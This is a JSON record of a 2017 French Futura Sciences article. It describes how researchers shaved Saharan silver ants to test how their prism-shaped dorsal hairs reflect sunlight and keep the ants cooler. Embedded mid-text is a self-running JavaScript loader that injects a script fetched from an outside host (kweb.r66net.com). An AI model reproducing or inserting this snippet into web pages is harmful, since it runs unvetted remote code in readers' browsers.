{"title": "Science decalee : des fourmis se font epiler pour la science", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-03-11", "content": "Les fourmis argentees du Sahara sont capables de vivre a des temperatures particulierement elevees, en partie grace aux poils qui recouvrent leur face dorsale. Pour mieux comprendre le role de ces poils, des chercheurs ont rase des fourmis. Une experience de precision plutot delicate. Le  desert du Sahara  est l'un des environnements les plus rudes de la planete, avec des temperatures torrides dans la journee, que subissent les animaux qui y vivent. Ainsi, la fourmi argentee  Cataglyphis bombycina  vit dans le Sahara, le Sinai et des deserts de la  peninsule  arabique. C'est l'un des organismes vivants les mieux adaptes a de hautes temperatures. Alors que la plupart des animaux restent a l'abri de la  chaleur  du  soleil  le jour, les  fourmis  argentees choisissent le milieu de la journee pour chercher de la nourriture ; les temperatures depassent alors 50 degC. Cette strategie leur permet d'echapper a leurs predateurs, comme les lezards, qui evitent ces temperatures insupportables. Les fourmis presentent plusieurs adaptations pour les aider a supporter la  chaleur extreme  : elles ont des pattes plus longues que les autres fourmis, ce qui les tient un peu plus eloignees du  sable  et leur permet de courir plus vite pour reduire le temps passe a l'exterieur ; elles produisent aussi des  proteines   heat shock  avant de sortir du nid ce qui permet a leur organisme de reagir vite a la chaleur soudaine. Mais elles auraient un atout supplementaire : des poils hors du commun, aux proprietes optiques extraordinaires. En effet, la face dorsale des ouvrieres ( thorax  et  abdomen ) est recouverte de poils denses qui donnent a la  fourmi  son aspect argente et jouent un role de thermoregulation. Pour mieux etudier le role de ces poils, des chercheurs belges ont recupere des fourmis dans des dunes de sable d' Erg  Chebbi, dans le sud-est du Maroc. Ils ont observe ces poils au  microscope  et rase des fourmis pour les besoins de cette experience decrite dans la revue  PLOS One . Observation au microscope electronique des stries sur les poils des fourmis argentees. (c) Willot  et al.  2016,  PLOS One                               Les poils reflechissent la lumiere comme un prisme Les poils ont une section triangulaire, ce qui en fait des prismes avec comme base un triangle isocele ayant un angle de 72deg et deux angles de 54deg. De plus, ils portent des stries microscopiques sur les deux faces du  prisme  exposees vers l'exterieur : ces stries de 66 nm de profondeur sont separees de 204 nm et la face du bas n'est pas striee. Ce poil en forme de prisme reflechit entre 95 et 98 % de l' energie , ce qui permet un effet  miroir  unique dans le monde animal.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le fait de reflechir la  lumiere  permet d'eviter la chaleur mais pourrait aussi servir au camouflage ou a la communication. La forme triangulaire des  poils   contraste  avec la forme cylindrique typique de la plupart des  arthropodes . Mais l'experience ne s'arrete pas la : au laboratoire, les chercheurs ont rase les fourmis. Dans  MailOnLine , Quentin Willot, principal auteur de l'article, a explique que c'etait  << une procedure delicate >> , car les fourmis se debattent quand elles sont capturees  << ce qui empeche toute tentative de rasage si elles ne sont pas anesthesiees >> . Les fourmis ont donc ete endormies avec du  dioxyde de carbone  puis les poils ont ete retires en utilisant une loupe binoculaire et une lame bien aiguisee :  << C'est la meme chose que de vous raser le menton : la lame du scalpel doit se deplacer dans la direction opposee a la croissance du cheveu. Cela doit etre un  mouvement  delicat et doux. >>  Une  fourmi ouvriere  etait rasee en une heure et environ 40 fourmis ont ete rasees pour obtenir sept animaux prets pour l'experience. Les chercheurs ont observe que les poils qui recouvrent la face dorsale de la fourmi reflechissent environ dix fois plus de lumiere que des  cuticules  rasees. De plus, les fourmis \"poilues\" chauffaient moins vite et restaient a une temperature de 2 degC plus basse. Des fourmis sont friandes du sirop de grenadine                       Une goutte de sirop de grenadine attire une colonie de fourmis qui passait par la. Celles-ci se chargent alors de faire disparaitre le liquide.                                       Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  recherche pour science  |  quel bac pour science po  |  pour ou contre progres de science  |  science vie junior pour quel age  |  fabriquer pince epiler  |  futura science  |  science vie podcast  |  cadeau science  |  science sur empoule", "theme": "planete"}